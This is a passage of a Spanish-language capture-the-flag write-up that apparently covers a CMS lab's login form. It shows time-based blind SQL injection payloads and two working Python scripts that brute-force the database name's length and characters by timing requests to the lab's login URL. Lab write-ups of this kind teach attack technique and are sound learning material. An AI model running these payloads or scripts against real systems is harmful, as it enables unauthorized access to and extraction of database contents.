Tenemos lo que parece ser el mismo sitio de la versión uno:

![image](https://user-images.githubusercontent.com/43856126/114126795-a7347680-98e8-11eb-9836-a8504543979a.png)

Con el cambio de que ahora si queremos editar o crear una nueva página nos redirige a un login:

![image](https://user-images.githubusercontent.com/43856126/114126865-be736400-98e8-11eb-8cae-749fa0d3e71e.png)

# Flag 0
Aquí lo primero que se me ocurre al ver un login es probar algo de SQL injection, así que con una prueba básica:

![image](https://user-images.githubusercontent.com/43856126/114126962-faa6c480-98e8-11eb-8530-2467ca3f768b.png)

Y esto nos dice que la contraseña no es la correcta:

![image](https://user-images.githubusercontent.com/43856126/114126995-07c3b380-98e9-11eb-8b3e-bb3d1f6bc3f0.png)

En este caso podríamos tratar de hacer un ataque de diccionario para ver si podemos encontrar la constraseña, pero a modo de prueba tratamos de romper la consulta simplemente agregando una comilla simple:

![image](https://user-images.githubusercontent.com/43856126/114127356-cd0e4b00-98e9-11eb-81d5-8810c660fe4a.png)

Y esto nos da un error:

![image](https://user-images.githubusercontent.com/43856126/114127406-e0211b00-98e9-11eb-98e2-c7fafbd74617.png)

Traté con algunos payloads para error based, pero lo que parece ser aquí es que tendríamos que usar un poco de blind SQL, así, que probando con un sleep se puede ver que se puede disparar el sleep
 
![image](https://user-images.githubusercontent.com/43856126/114129537-427c1a80-98ee-11eb-9a6b-652fd75e7c88.png)

En esta parte se podría hacer uso de sqlmap para hacerlo mucho más rápido, pero a manera de práctica me decidí hacerlo implementando scripts desarrollados en python 3

Dicho esto, el payload base para hacer todas mis pruebas será con un time delay, así que el primero payload quedaría cómo:

`' union SELECT IF(LENGTH(database())=1,sleep(5),'a')-- -`

Esto es para determinar primero la longitud del nombre de la base de datos.

Mi script final qudaría de la siguiente manera, ya incluye el computo del tiempo para determinar si se tarda cierto tiempo...

```
import requests
from time import time

#payload = "' UNION SELECT IF(LENGTH(database())=1,sleep(5),'a')-- -"
for i in range (30):

    payload = "' UNION SELECT IF(LENGTH(database())=" + str(i+1) + ",sleep(5),'a')-- -"
    print ("Payload >> ", payload)
    dat = {"username": payload, "password": "test"}

    url = "http://34.94.3.143/702d18a2c3/login"
    
    time_start = time()
    r = requests.post(url, data = dat)
    time_end = time()
    
    timeT = time_end - time_start
    if timeT > 4:
        print("[+] Longitud entontrada >> ", i + 1)
        break
```


Al ejecutar este script podemos obtener la longitud del nombre de la base de datos que se esta usando:

![image](https://user-images.githubusercontent.com/43856126/114230641-eacec500-9968-11eb-96c7-c342f3260667.png)

Sabemos entonces que el nombre tiene una longitud de 6 caracteres, ahora usando el siguiente payload como base:

`' UNION SELECT IF(SUBSTRING(database(),1,1)='a',sleep(5),'a')-- -`

Con esto podemos construir nuestro script para encontrar el nombre de la base de datos, tenemos que ir cambiando la letra con la que se va compando, así, que ahora el script final quedaría de la siguiente manera:

```
import requests
from time import time
import string

l1 = list(string.ascii_lowercase)
lista = []

for i in range(len(l1)):
    lista.append(str(l1[i]))

for i in range (10):
    lista.append(str(i))   

dump = []

for i in range(6):
    
    for j in lista:

        payload = "' UNION SELECT IF(SUBSTRING(database(),"+str(i+1)+",1)='"+j+"',sleep(5),'a')-- -"
        print("Payload >>", payload)

        dat = {"username":payload,"password":"test"}

        url = "http://34.94.3.143/702d18a2c3/login"
        
        time_start = time()
        r = requests.post(url, data = dat)
        time_end = time()

        timeT = time_end - time_start

        if timeT > 4:
            print("[+] Caracter encontrado >> ", j)
            dump.append(j)
            break

for i in range (len(dump)):
    print(dump[i], end="")
```

Al ejecutar el script tenemos el nombre de la base de datos!

![image](https://user-images.githubusercontent.com/43856126/114232558-91b46080-996b-11eb-85a8-d9d52bc99e35.png)

Ahora sabemos que el nombre de la base de datos es level2, así que ahora toca encontrar las tablas que contiene esta base de datos.

